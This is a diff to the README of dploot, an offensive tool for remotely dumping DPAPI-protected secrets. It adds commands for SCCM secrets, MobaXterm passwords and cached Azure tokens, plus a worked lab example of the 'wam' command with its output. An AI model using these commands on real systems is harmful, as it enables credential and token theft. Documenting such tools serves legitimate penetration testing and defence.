@@ -35,6 +35,7 @@ If you don't know what is DPAPI, [check out this post](https://posts.specterops.
       - [sccm](#sccm)
       - [backupkey](#backupkey)
       - [mobaxterm](#mobaxterm)
+      - [wam](#wam)
   - [Credits](#credits)
   - [TODO](#TODO)
 
@@ -61,12 +62,14 @@ sudo apt install python3-dploot
 ## Usage
 
 ```text
-usage: dploot [-h] [-debug] [-quiet] {certificates,credentials,masterkeys,vaults,backupkey,rdg,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi} ...
+usage: dploot [-h] [-debug] [-quiet] [-export-dir DIR]
+              {certificates,credentials,masterkeys,vaults,backupkey,rdg,sccm,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi,mobaxterm,wam}
+              ...
 
-DPAPI looting remotely in Python
+DPAPI looting remotely in Python. Version 2.7.3
 
 positional arguments:
-  {certificates,credentials,masterkeys,vaults,backupkey,rdg,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi}
+  {certificates,credentials,masterkeys,vaults,backupkey,rdg,sccm,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi,mobaxterm,wam}
                         Action
     certificates        Dump users certificates from remote target
     credentials         Dump users Credential Manager blob from remote target
@@ -74,6 +77,7 @@ positional arguments:
     vaults              Dump users Vaults blob from remote target
     backupkey           Backup Keys from domain controller
     rdg                 Dump users saved password information for RDCMan.settings from remote target
+    sccm                Dump SCCM secrets (NAA, Collection variables, tasks sequences credentials) from remote target
     triage              Loot Masterkeys (if not set), credentials, rdg, certificates, browser and vaults from remote target
     machinemasterkeys   Dump system masterkey from remote target
     machinecredentials  Dump system credentials from remote target
@@ -83,11 +87,14 @@ positional arguments:
     machinetriage       Loot SYSTEM Masterkeys (if not set), SYSTEM credentials, SYSTEM certificates and SYSTEM vaults from remote target
     browser             Dump users credentials and cookies saved in browser from remote target
     wifi                Dump wifi profiles from remote target
+    mobaxterm           Dump Passwords and Credentials from MobaXterm
+    wam                 Dump users cached azure tokens from remote target
 
 options:
   -h, --help            show this help message and exit
   -debug                Turn DEBUG output ON
   -quiet                Only output dumped credentials
+  -export-dir DIR       Dump looted files to specified directory, regardless they were decrypted
 ```
 
 ### Kerberos
@@ -761,6 +768,32 @@ Password:	waza1234
 Username:	mobauser@mobaserver
 Password:	309554moba231082pass322883
 ```
+
+### wam
+
+The **wam** command will search for TBRES files from Token Broker Cache and decrypt their content with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys. 
+
+With `pvk`:
+
+```text
+dploot wam -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 -pvk key.pvk
+[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
+
+[*] Triage ALL USERS masterkeys
+
+{d5efdaf1-9fd9-44e7-8bd1-7e017d458c14}:a7eac2a750069aa576e1e9f03f1dc37b2057adb3
+{13405569-1685-49c7-90e2-0e7ce55e5b8b}:ab1b23d3380c53ac1dae1cdf62bc44b4db391bb9
+
+[*] Triage Office Token Broken Cache for ALL USERS
+
+[TBRES FILE]
+Version: 1
+expiration: 133668881920000000
+responses: b'\x8aC\xed\x9f\xf4\xe6D!\x0c\x82\x86)\xab\x1d\xf9\xac'
+WTRes_Token: access_token=eyJhb[...]
+```
+
+***Tips***: *You can find Microsoft access token for Entra users in TBRES files.*
 
 ## Credits
 
